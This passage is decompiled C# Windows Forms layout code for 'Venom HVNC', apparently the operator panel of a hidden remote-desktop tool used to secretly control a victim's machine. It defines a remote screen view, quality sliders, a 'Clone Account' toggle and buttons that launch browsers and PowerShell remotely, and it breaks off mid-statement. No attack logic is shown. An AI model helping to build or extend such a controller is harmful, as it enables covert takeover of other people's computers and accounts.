namespace HVNC
{
	// Token: 0x0200001F RID: 31
	public partial class FrmVNC : global::System.Windows.Forms.Form
	{
		// Token: 0x06000119 RID: 281 RVA: 0x00002919 File Offset: 0x00000B19
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x0600011A RID: 282 RVA: 0x0000E48C File Offset: 0x0000C68C
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::HVNC.FrmVNC));
			this.panel1 = new global::System.Windows.Forms.Panel();
			this.siticoneControlBox3 = new global::Siticone.Desktop.UI.WinForms.SiticoneControlBox();
			this.siticoneControlBox2 = new global::Siticone.Desktop.UI.WinForms.SiticoneControlBox();
			this.siticoneControlBox1 = new global::Siticone.Desktop.UI.WinForms.SiticoneControlBox();
			this.label2 = new global::System.Windows.Forms.Label();
			this.pictureBox1 = new global::System.Windows.Forms.PictureBox();
			this.timer2 = new global::System.Windows.Forms.Timer(this.components);
			this.toolStripStatusLabel2 = new global::System.Windows.Forms.ToolStripStatusLabel();
			this.toolStripStatusLabel1 = new global::System.Windows.Forms.ToolStripStatusLabel();
			this.timer1 = new global::System.Windows.Forms.Timer(this.components);
			this.ledstatus = new global::System.Windows.Forms.Label();
			this.label3 = new global::System.Windows.Forms.Label();
			this.chkClone1 = new global::System.Windows.Forms.Label();
			this.QualityLabel = new global::System.Windows.Forms.Label();
			this.VNCBox = new global::System.Windows.Forms.PictureBox();
			this.toolStripSeparator1 = new global::System.Windows.Forms.ToolStripSeparator();
			this.siticoneGradientPanel4 = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientPanel();
			this.statusled = new global::Siticone.Desktop.UI.WinForms.SiticoneCirclePictureBox();
			this.QualityScroll = new global::Siticone.Desktop.UI.WinForms.SiticoneTrackBar();
			this.ResizeScroll = new global::Siticone.Desktop.UI.WinForms.SiticoneTrackBar();
			this.chkClone = new global::Siticone.Desktop.UI.WinForms.SiticoneToggleSwitch();
			this.ToggleHVNC = new global::Siticone.Desktop.UI.WinForms.SiticoneToggleSwitch();
			this.siticoneGradientPanel1 = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientPanel();
			this.siticoneResizeBox1 = new global::Siticone.Desktop.UI.WinForms.SiticoneResizeBox();
			this.toolStripStatusLabel3 = new global::System.Windows.Forms.Label();
			this.siticoneGradientPanel2 = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientPanel();
			this.test2ToolStripMenuItem = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton();
			this.CloseBtn = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton();
			this.braveToolStripMenuItem = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton();
			this.powershellToolStripMenuItem = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton();
			this.test1ToolStripMenuItem = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton();
			this.edgeToolStripMenuItem = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton();
			this.fileExplorerToolStripMenuItem = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton();
			this.IntervalLabel = new global::System.Windows.Forms.Label();
			this.siticoneBorderlessForm1 = new global::Siticone.Desktop.UI.WinForms.SiticoneBorderlessForm(this.components);
			this.siticoneDragControl1 = new global::Siticone.Desktop.UI.WinForms.SiticoneDragControl(this.components);
			this.IntervalScroll = new global::Siticone.Desktop.UI.WinForms.SiticoneTrackBar();
			this.panel1.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
			((global::System.ComponentModel.ISupportInitialize)this.VNCBox).BeginInit();
			this.siticoneGradientPanel4.SuspendLayout();
			this.statusled.BeginInit();
			this.siticoneGradientPanel1.SuspendLayout();
			this.siticoneGradientPanel2.SuspendLayout();
			base.SuspendLayout();
			this.panel1.BackColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.panel1.Controls.Add(this.siticoneControlBox3);
			this.panel1.Controls.Add(this.siticoneControlBox2);
			this.panel1.Controls.Add(this.siticoneControlBox1);
			this.panel1.Controls.Add(this.label2);
			this.panel1.Controls.Add(this.pictureBox1);
			this.panel1.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.panel1.Location = new global::System.Drawing.Point(0, 0);
			this.panel1.Name = "panel1";
			this.panel1.Size = new global::System.Drawing.Size(1261, 37);
			this.panel1.TabIndex = 32;
			this.siticoneControlBox3.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right);
			this.siticoneControlBox3.FillColor = global::System.Drawing.Color.Transparent;
			this.siticoneControlBox3.HoverState.Parent = this.siticoneControlBox3;
			this.siticoneControlBox3.IconColor = global::System.Drawing.Color.White;
			this.siticoneControlBox3.Location = new global::System.Drawing.Point(1228, 3);
			this.siticoneControlBox3.Name = "siticoneControlBox3";
			this.siticoneControlBox3.ShadowDecoration.Parent = this.siticoneControlBox3;
			this.siticoneControlBox3.Size = new global::System.Drawing.Size(30, 30);
			this.siticoneControlBox3.TabIndex = 148;
			this.siticoneControlBox2.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right);
			this.siticoneControlBox2.ControlBoxType = 1;
			this.siticoneControlBox2.FillColor = global::System.Drawing.Color.Transparent;
			this.siticoneControlBox2.HoverState.Parent = this.siticoneControlBox2;
			this.siticoneControlBox2.IconColor = global::System.Drawing.Color.White;
			this.siticoneControlBox2.Location = new global::System.Drawing.Point(1192, 3);
			this.siticoneControlBox2.Name = "siticoneControlBox2";
			this.siticoneControlBox2.ShadowDecoration.Parent = this.siticoneControlBox2;
			this.siticoneControlBox2.Size = new global::System.Drawing.Size(30, 30);
			this.siticoneControlBox2.TabIndex = 148;
			this.siticoneControlBox1.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right);
			this.siticoneControlBox1.ControlBoxType = 0;
			this.siticoneControlBox1.FillColor = global::System.Drawing.Color.Transparent;
			this.siticoneControlBox1.HoverState.Parent = this.siticoneControlBox1;
			this.siticoneControlBox1.IconColor = global::System.Drawing.Color.White;
			this.siticoneControlBox1.Location = new global::System.Drawing.Point(1156, 3);
			this.siticoneControlBox1.Name = "siticoneControlBox1";
			this.siticoneControlBox1.ShadowDecoration.Parent = this.siticoneControlBox1;
			this.siticoneControlBox1.Size = new global::System.Drawing.Size(30, 30);
			this.siticoneControlBox1.TabIndex = 148;
			this.label2.AutoSize = true;
			this.label2.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label2.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.label2.Location = new global::System.Drawing.Point(36, 6);
			this.label2.Name = "label2";
			this.label2.Size = new global::System.Drawing.Size(109, 20);
			this.label2.TabIndex = 147;
			this.label2.Text = "Venom HVNC";
			this.pictureBox1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("pictureBox1.Image");
			this.pictureBox1.Location = new global::System.Drawing.Point(0, 0);
			this.pictureBox1.Name = "pictureBox1";
			this.pictureBox1.Size = new global::System.Drawing.Size(30, 30);
			this.pictureBox1.SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			this.pictureBox1.TabIndex = 145;
			this.pictureBox1.TabStop = false;
			this.timer2.Enabled = true;
			this.timer2.Interval = 1000;
			this.timer2.Tick += new global::System.EventHandler(this.timer2_Tick);
			this.toolStripStatusLabel2.Name = "toolStripStatusLabel2";
			this.toolStripStatusLabel2.Size = new global::System.Drawing.Size(26, 17);
			this.toolStripStatusLabel2.Text = "Idle";
			this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
			this.toolStripStatusLabel1.Size = new global::System.Drawing.Size(44, 17);
			this.toolStripStatusLabel1.Text = "Statut :";
			this.timer1.Tick += new global::System.EventHandler(this.timer1_Tick);
			this.ledstatus.Anchor = global::System.Windows.Forms.AnchorStyles.Top;
			this.ledstatus.AutoSize = true;
			this.ledstatus.BackColor = global::System.Drawing.Color.Transparent;
			this.ledstatus.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.ledstatus.Location = new global::System.Drawing.Point(509, 12);
			this.ledstatus.Name = "ledstatus";
			this.ledstatus.Size = new global::System.Drawing.Size(27, 13);
			this.ledstatus.TabIndex = 150;
			this.ledstatus.Text = "N/A";
			this.label3.Anchor = global::System.Windows.Forms.AnchorStyles.Top;
			this.label3.AutoSize = true;
			this.label3.BackColor = global::System.Drawing.Color.Transparent;
			this.label3.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.label3.Location = new global::System.Drawing.Point(551, 12);
			this.label3.Name = "label3";
			this.label3.Size = new global::System.Drawing.Size(77, 13);
			this.label3.TabIndex = 150;
			this.label3.Text = "Clone Account";
			this.chkClone1.Anchor = global::System.Windows.Forms.AnchorStyles.Top;
			this.chkClone1.AutoSize = true;
			this.chkClone1.BackColor = global::System.Drawing.Color.Transparent;
			this.chkClone1.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.chkClone1.Location = new global::System.Drawing.Point(1000, 12);
			this.chkClone1.Name = "chkClone1";
			this.chkClone1.Size = new global::System.Drawing.Size(68, 13);
			this.chkClone1.TabIndex = 4;
			this.chkClone1.Text = "Resize : 50%";
			this.QualityLabel.Anchor = global::System.Windows.Forms.AnchorStyles.Top;
			this.QualityLabel.AutoSize = true;
			this.QualityLabel.BackColor = global::System.Drawing.Color.Transparent;
			this.QualityLabel.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.QualityLabel.Location = new global::System.Drawing.Point(795, 12);
			this.QualityLabel.Name = "QualityLabel";
			this.QualityLabel.Size = new global::System.Drawing.Size(52, 13);
			this.QualityLabel.TabIndex = 5;
			this.QualityLabel.Text = "HQ : 50%";
			this.VNCBox.BackColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.VNCBox.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.VNCBox.ErrorImage = null;
			this.VNCBox.InitialImage = null;
			this.VNCBox.Location = new global::System.Drawing.Point(0, 71);
			this.VNCBox.Name = "VNCBox";
			this.VNCBox.Size = new global::System.Drawing.Size(1261, 643);
			this.VNCBox.SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			this.VNCBox.TabIndex = 40;
			this.VNCBox.TabStop = false;
			this.VNCBox.MouseDown += new global::System.Windows.Forms.MouseEventHandler(this.VNCBox_MouseDown);
			this.VNCBox.MouseEnter += new global::System.EventHandler(this.VNCBox_MouseEnter);
			this.VNCBox.MouseLeave += new global::System.EventHandler(this.VNCBox_MouseLeave);
			this.VNCBox.MouseHover += new global::System.EventHandler(this.VNCBox_MouseHover);
			this.VNCBox.MouseMove += new global::System.Windows.Forms.MouseEventHandler(this.VNCBox_MouseMove);
			this.VNCBox.MouseUp += new global::System.Windows.Forms.MouseEventHandler(this.VNCBox_MouseUp);
			this.toolStripSeparator1.Name = "toolStripSeparator1";
			this.toolStripSeparator1.Size = new global::System.Drawing.Size(244, 6);
			this.siticoneGradientPanel4.BackColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.siticoneGradientPanel4.Controls.Add(this.statusled);
			this.siticoneGradientPanel4.Controls.Add(this.QualityScroll);
			this.siticoneGradientPanel4.Controls.Add(this.ResizeScroll);
			this.siticoneGradientPanel4.Controls.Add(this.chkClone);
			this.siticoneGradientPanel4.Controls.Add(this.ToggleHVNC);
			this.siticoneGradientPanel4.Controls.Add(this.ledstatus);
			this.siticoneGradientPanel4.Controls.Add(this.label3);
			this.siticoneGradientPanel4.Controls.Add(this.chkClone1);
			this.siticoneGradientPanel4.Controls.Add(this.QualityLabel);
			this.siticoneGradientPanel4.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.siticoneGradientPanel4.FillColor = global::System.Drawing.Color.FromArgb(27, 91, 50);
			this.siticoneGradientPanel4.FillColor2 = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.siticoneGradientPanel4.Location = new global::System.Drawing.Point(0, 37);
			this.siticoneGradientPanel4.Name = "siticoneGradientPanel4";
			this.siticoneGradientPanel4.ShadowDecoration.Parent = this.siticoneGradientPanel4;
			this.siticoneGradientPanel4.Size = new global::System.Drawing.Size(1261, 34);
			this.siticoneGradientPanel4.TabIndex = 124;
			this.statusled.Anchor = global::System.Windows.Forms.AnchorStyles.Top;
			this.statusled.BackColor = global::System.Drawing.Color.Transparent;
			this.statusled.ErrorImage = null;
			this.statusled.ImageRotate = 0f;
			this.statusled.Location = new global::System.Drawing.Point(485, 8);
			this.statusled.Name = "statusled";
			this.statusled.ShadowDecoration.Mode = 1;
			this.statusled.ShadowDecoration.Parent = this.statusled;
			this.statusled.Size = new global::System.Drawing.Size(20, 20);
			this.statusled.TabIndex = 153;
			this.statusled.TabStop = false;
			this.QualityScroll.Anchor = global::System.Windows.Forms.AnchorStyles.Top;
			this.QualityScroll.BackColor = global::System.Drawing.Color.Transparent;
			this.QualityScroll.FillColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.QualityScroll.HoverState.Parent = this.QualityScroll;
			this.QualityScroll.Location = new global::System.Drawing.Point(853, 7);
			this.QualityScroll.Name = "QualityScroll";
			this.QualityScroll.Size = new global::System.Drawing.Size(111, 23);
			this.QualityScroll.Style = 1;
			this.QualityScroll.TabIndex = 152;
			this.QualityScroll.ThumbColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.QualityScroll.Scroll += new global::System.Windows.Forms.ScrollEventHandler(this.QualityScroll_Scroll);
			this.ResizeScroll.Anchor = global::System.Windows.Forms.AnchorStyles.Top;
			this.ResizeScroll.BackColor = global::System.Drawing.Color.Transparent;
			this.ResizeScroll.FillColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.ResizeScroll.HoverState.Parent = this.ResizeScroll;
			this.ResizeScroll.Location = new global::System.Drawing.Point(1076, 6);
			this.ResizeScroll.Name = "ResizeScroll";
			this.ResizeScroll.Size = new global::System.Drawing.Size(111, 23);
			this.ResizeScroll.Style = 1;
			this.ResizeScroll.TabIndex = 152;
			this.ResizeScroll.ThumbColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.ResizeScroll.Scroll += new global::System.Windows.Forms.ScrollEventHandler(this.ResizeScroll_Scroll);
			this.chkClone.Anchor = global::System.Windows.Forms.AnchorStyles.Top;
			this.chkClone.BackColor = global::System.Drawing.Color.Transparent;
			this.chkClone.CheckedState.BorderColor = global::System.Drawing.Color.Transparent;
			this.chkClone.CheckedState.FillColor = global::System.Drawing.Color.Transparent;
			this.chkClone.CheckedState.InnerBorderColor = global::System.Drawing.Color.White;
			this.chkClone.CheckedState.InnerBorderThickness = 2;
			this.chkClone.CheckedState.InnerColor = global::System.Drawing.Color.FromArgb(29, 185, 84);
			this.chkClone.CheckedState.Parent = this.chkClone;
			this.chkClone.Location = new global::System.Drawing.Point(634, 8);
			this.chkClone.Name = "chkClone";
			this.chkClone.ShadowDecoration.Parent = this.chkClone;
			this.chkClone.Size = new global::System.Drawing.Size(39, 20);
			this.chkClone.TabIndex = 150;
			this.chkClone.UncheckedState.BorderColor = global::System.Drawing.Color.Transparent;
			this.chkClone.UncheckedState.FillColor = global::System.Drawing.Color.Transparent;
			this.chkClone.UncheckedState.InnerBorderColor = global::System.Drawing.Color.White;
			this.chkClone.UncheckedState.InnerColor = global::System.Drawing.Color.FromArgb(29, 185, 84);
			this.chkClone.UncheckedState.Parent = this.chkClone;
			this.ToggleHVNC.BackColor = global::System.Drawing.Color.Transparent;
			this.ToggleHVNC.CheckedState.BorderColor = global::System.Drawing.Color.Transparent;
			this.ToggleHVNC.CheckedState.FillColor = global::System.Drawing.Color.Transparent;
			this.ToggleHVNC.CheckedState.InnerBorderColor = global::System.Drawing.Color.White;
			this.ToggleHVNC.CheckedState.InnerBorderThickness = 2;
			this.ToggleHVNC.CheckedState.InnerColor = global::System.Drawing.Color.FromArgb(29, 185, 84);
			this.ToggleHVNC.CheckedState.Parent = this.ToggleHVNC;
			this.ToggleHVNC.Location = new global::System.Drawing.Point(40, 8);
			this.ToggleHVNC.Name = "ToggleHVNC";
			this.ToggleHVNC.ShadowDecoration.Parent = this.ToggleHVNC;
			this.ToggleHVNC.Size = new global::System.Drawing.Size(39, 20);
			this.ToggleHVNC.TabIndex = 150;
			this.ToggleHVNC.UncheckedState.BorderColor = global::System.Drawing.Color.Transparent;
			this.ToggleHVNC.UncheckedState.FillColor = global::System.Drawing.Color.Transparent;
			this.ToggleHVNC.UncheckedState.InnerBorderColor = global::System.Drawing.Color.White;
			this.ToggleHVNC.UncheckedState.InnerColor = global::System.Drawing.Color.FromArgb(29, 185, 84);
			this.ToggleHVNC.UncheckedState.Parent = this.ToggleHVNC;
			this.ToggleHVNC.CheckedChanged += new global::System.EventHandler(this.ToggleHVNC_CheckedChanged);
			this.siticoneGradientPanel1.BackColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.siticoneGradientPanel1.Controls.Add(this.siticoneResizeBox1);
			this.siticoneGradientPanel1.Controls.Add(this.toolStripStatusLabel3);
			this.siticoneGradientPanel1.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.siticoneGradientPanel1.FillColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.siticoneGradientPanel1.FillColor2 = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.siticoneGradientPanel1.Location = new global::System.Drawing.Point(0, 750);
			this.siticoneGradientPanel1.Name = "siticoneGradientPanel1";
			this.siticoneGradientPanel1.ShadowDecoration.Parent = this.siticoneGradientPanel1;
			this.siticoneGradientPanel1.Size = new global::System.Drawing.Size(1261, 25);
			this.siticoneGradientPanel1.TabIndex = 125;
			this.siticoneResizeBox1.Anchor = (global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Right);
			this.siticoneResizeBox1.BackColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.siticoneResizeBox1.FillColor = global::System.Drawing.Color.White;
			this.siticoneResizeBox1.ForeColor = global::System.Drawing.Color.Black;
			this.siticoneResizeBox1.Location = new global::System.Drawing.Point(1239, 4);
			this.siticoneResizeBox1.Name = "siticoneResizeBox1";
			this.siticoneResizeBox1.Size = new global::System.Drawing.Size(20, 20);
			this.siticoneResizeBox1.TabIndex = 171;
			this.siticoneResizeBox1.TargetControl = this;
			this.toolStripStatusLabel3.AutoSize = true;
			this.toolStripStatusLabel3.BackColor = global::System.Drawing.Color.Transparent;
			this.toolStripStatusLabel3.ForeColor = global::System.Drawing.Color.DarkGray;
			this.toolStripStatusLabel3.Location = new global::System.Drawing.Point(2, 6);
			this.toolStripStatusLabel3.Name = "toolStripStatusLabel3";
			this.toolStripStatusLabel3.Size = new global::System.Drawing.Size(37, 13);
			this.toolStripStatusLabel3.TabIndex = 0;
			this.toolStripStatusLabel3.Text = "Status";
			this.toolStripStatusLabel3.Visible = false;
			this.toolStripStatusLabel3.TextChanged += new global::System.EventHandler(this.toolStripStatusLabel3_TextChanged);
			this.siticoneGradientPanel2.BackColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.siticoneGradientPanel2.Controls.Add(this.test2ToolStripMenuItem);
			this.siticoneGradientPanel2.Controls.Add(this.CloseBtn);
			this.siticoneGradientPanel2.Controls.Add(this.braveToolStripMenuItem);
			this.siticoneGradientPanel2.Controls.Add(this.powershellToolStripMenuItem);
			this.siticoneGradientPanel2.Controls.Add(this.test1ToolStripMenuItem);
			this.siticoneGradientPanel2.Controls.Add(this.edgeToolStripMenuItem);
			this.siticoneGradientPanel2.Controls.Add(this.fileExplorerToolStripMenuItem);
			this.siticoneGradientPanel2.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.siticoneGradientPanel2.FillColor = global::System.Drawing.Color.FromArgb(27, 91, 50);
			this.siticoneGradientPanel2.FillColor2 = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.siticoneGradientPanel2.Location = new global::System.Drawing.Point(0, 714);
			this.siticoneGradientPanel2.Name = "siticoneGradientPanel2";
			this.siticoneGradientPanel2.ShadowDecoration.Parent = this.siticoneGradientPanel2;
			this.siticoneGradientPanel2.Size = new global::System.Drawing.Size(1261, 36);
			this.siticoneGradientPanel2.TabIndex = 126;
			this.test2ToolStripMenuItem.Anchor = global::System.Windows.Forms.AnchorStyles.Top;
			this.test2ToolStripMenuItem.Animated = true;
			this.test2ToolStripMenuItem.BackColor = global::System.Drawing.Color.Transparent;
			this.test2ToolStripMenuItem.BorderColor = global::System.Drawing.Color.Transparent;
			this.test2ToolStripMenuItem.BorderRadius = 1;
			this.test2ToolStripMenuItem.BorderThickness = 1;
			this.test2ToolStripMenuItem.CheckedState.Parent = this.test2ToolStripMenuItem;
			this.test2ToolStripMenuItem.CustomImages.Parent = this.test2ToolStripMenuItem;
			this.test2ToolStripMenuItem.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.test2ToolStripMenuItem.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.test2ToolStripMenuItem.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.test2ToolStripMenuItem.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.test2ToolStripMenuItem.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.test2ToolStripMenuItem.DisabledState.Parent = this.test2ToolStripMenuItem;
			this.test2ToolStripMenuItem.FillColor = global::System.Drawing.Color.Transparent;
			this.test2ToolStripMenuItem.FillColor2 = global::System.Drawing.Color.Transparent;
			this.test2ToolStripMenuItem.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.test2ToolStripMenuItem.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.test2ToolStripMenuItem.HoverState.Parent = this.test2ToolStripMenuItem;
			this.test2ToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("test2ToolStripMenuItem.Image");
			this.test2ToolStripMenuItem.Location = new global::System.Drawing.Point(554, 3);
			this.test2ToolStripMenuItem.Name = "test2ToolStripMenuItem";
			this.test2ToolStripMenuItem.ShadowDecoration.Parent = this.test2ToolStripMenuItem;
			this.test2ToolStripMenuItem.Size = new global::System.Drawing.Size(106, 31);
			this.test2ToolStripMenuItem.TabIndex = 67;
			this.test2ToolStripMenuItem.Text = "Firefox";
			this.test2ToolStripMenuItem.Click += new global::System.EventHandler(this.test2ToolStripMenuItem_Click);
			this.CloseBtn.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right);
			this.CloseBtn.Animated = true;
			this.CloseBtn.BackColor = global::System.Drawing.Color.Transparent;
			this.CloseBtn.BorderColor = global::System.Drawing.Color.Transparent;
			this.CloseBtn.BorderRadius = 1;
			this.CloseBtn.BorderThickness = 1;
			this.CloseBtn.CheckedState.Parent = this.CloseBtn;
			this.CloseBtn.CustomImages.Parent = this.CloseBtn;
			this.CloseBtn.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.CloseBtn.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.CloseBtn.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.CloseBtn.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.CloseBtn.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.CloseBtn.DisabledState.Parent = this.CloseBtn;
			this.CloseBtn.FillColor = global::System.Drawing.Color.Transparent;
			this.CloseBtn.FillColor2 = global::System.Drawing.Color.Transparent;
			this.CloseBtn.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.CloseBtn.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.CloseBtn.HoverState.Parent = this.CloseBtn;
			this.CloseBtn.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("CloseBtn.Image");
			this.CloseBtn.Location = new global::System.Drawing.Point(1140, 3);
			this.CloseBtn.Name = "CloseBtn";
			this.CloseBtn.ShadowDecoration.Parent = this.CloseBtn;
			this.CloseBtn.Size = new global::System.Drawing.Size(109, 31);
			this.CloseBtn.TabIndex = 67;
			this.CloseBtn.Text = "Close Window";
			this.CloseBtn.Click += new global::System.EventHandler(this.CloseBtn_Click);
			this.braveToolStripMenuItem.Anchor = global::System.Windows.Forms.AnchorStyles.Top;
			this.braveToolStripMenuItem.Animated = true;
			this.braveToolStripMenuItem.BackColor = global::System.Drawing.Color.Transparent;
			this.braveToolStripMenuItem.BorderColor = global::System.Drawing.Color.Transparent;
			this.braveToolStripMenuItem.BorderRadius = 1;
			this.braveToolStripMenuItem.BorderThickness = 1;
			this.braveToolStripMenuItem.CheckedState.Parent = this.braveToolStripMenuItem;
			this.braveToolStripMenuItem.CustomImages.Parent = this.braveToolStripMenuItem;
			this.braveToolStripMenuItem.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.braveToolStripMenuItem.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.braveToolStripMenuItem.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.braveToolStripMenuItem.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.braveToolStripMenuItem.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.braveToolStripMenuItem.DisabledState.Parent = this.braveToolStripMenuItem;
			this.braveToolStripMenuItem.FillColor = global::System.Drawing.Color.Transparent;
			this.braveToolStripMenuItem.FillColor2 = global::System.Drawing.Color.Transparent;
			this.braveToolStripMenuItem.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.braveToolStripMenuItem.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.braveToolStripMenuItem.HoverState.Parent = this.braveToolStripMenuItem;
			this.braveToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("braveToolStripMenuItem.Image");
			this.braveToolStripMenuItem.Location = new global::System.Drawing.Point(432, 3);
			this.braveToolStripMenuItem.Name = "braveToolStripMenuItem";
			this.braveToolStripMenuItem.ShadowDecoration.Parent = this.braveToolStripMenuItem;
			this.braveToolStripMenuItem.Size = new global::System.Drawing.Size(106, 31);
			this.braveToolStripMenuItem.TabIndex = 67;
			this.braveToolStripMenuItem.Text = "Brave";
			this.braveToolStripMenuItem.Click += new global::System.EventHandler(this.braveToolStripMenuItem_Click);
			this.powershellToolStripMenuItem.Anchor = global::System.Windows.Forms.AnchorStyles.Top;
			this.powershellToolStripMenuItem.Animated = true;
			this.powershellToolStripMenuItem.BackColor = global::System.Drawing.Color.Transparent;
			this.powershellToolStripMenuItem.BorderColor = global::System.Drawing.Color.Transparent;
			this.powershellToolStripMenuItem.BorderRadius = 1;
			this.powershellToolStripMenuItem.BorderThickness = 1;
			this.powershellToolStripMenuItem.CheckedState.Parent = this.powershellToolStripMenuItem;
			this.powershellToolStripMenuItem.CustomImages.Parent = this.powershellToolStripMenuItem;
			this.powershellToolStripMenuItem.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.powershellToolStripMenuItem.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.powershellToolStripMenuItem.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.powershellToolStripMenuItem.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.powershellToolStripMenuItem.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.powershellToolStripMenuItem.DisabledState.Parent = this.powershellToolStripMenuItem;
			this.powershellToolStripMenuItem.FillColor = global::System.Drawing.Color.Transparent;
			this.powershellToolStripMenuItem.FillColor2 = global::System.Drawing.Color.Transparent;
			this.powershellToolStripMenuItem.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.powershellToolStripMenuItem.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.powershellToolStripMenuItem.HoverState.Parent = this.powershellToolStripMenuItem;
			this.powershellToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("powershellToolStripMenuItem.Image");
			this.powershellToolStripMenuItem.Location = new global::System.Drawing.Point(798, 3);
			this.powershellToolStripMenuItem.Name = "powershellToolStripMenuItem";
			this.powershellToolStripMenuItem.ShadowDecoration.Parent = this.powershellToolStripMenuItem;
			this.powershellToolStripMenuItem.Size = new global::System.Drawing.Size(106, 31);
			this.powershellToolStripMenuItem.TabIndex = 67;
			this.powershellToolStripMenuItem.Text = "Powershell";
			this.powershellToolStripMenuItem.Click += new global::System.EventHandler(this.powershellToolStripMenuItem_Click);
			this.test1ToolStripMenuItem.Anchor = global::System.Windows.Forms.AnchorStyles.Top;
			this.test1ToolStripMenuItem.Animated = true;
			this.test1ToolStripMenuItem.BackColor = global::System.Drawing.Color.Transparent;
			this.test1ToolStripMenuItem.BorderColor = global::System.Drawing.Color.Transparent;
			this.test1ToolStripMenuItem.BorderRadius = 1;
			this.test1ToolStripMenuItem.BorderThickness = 1;
			this.test1ToolStripMenuItem.CheckedState.Parent = this.test1ToolStripMenuItem;
			this.test1ToolStripMenuItem.CustomImages.Parent = this.test1ToolStripMenuItem;
			this.test1ToolStripMenuItem.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.test1ToolStripMenuItem.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.test1ToolStripMenuItem.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
